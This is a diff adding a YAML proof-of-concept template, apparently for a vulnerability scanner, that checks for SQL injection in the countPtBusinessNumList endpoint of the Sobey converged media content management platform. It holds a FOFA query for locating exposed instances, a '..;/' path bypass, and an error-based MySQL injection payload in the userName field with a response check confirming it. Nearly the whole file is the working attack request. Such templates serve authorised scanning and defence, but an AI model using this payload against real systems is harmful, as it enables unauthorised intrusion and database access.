@@ -1,0 +1,20 @@
+id: poc-yaml-sobey-imcmp-countptbusinessnumlist-sqli
+info:
+  name: 索贝融合媒体内容管理平台 countPtBusinessNumList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /sobey-mchEditor/js/..;/mch/Jzt/Business/countPtBusinessNumList
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: endTime=1&siteCode=&startTime=10&token=&userCode=&userName='+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,md5({{.t1}})))),0x7e),1709)+AND+'bckN'='bckN
+  expression: status_code == 500 && contains(body,"Sobey") && contains(body,".countPtBusinessNumList")
+    && contains(body,"java.sql.SQLException") && contains(body,`~` + t2 + `~`)
+transport: http
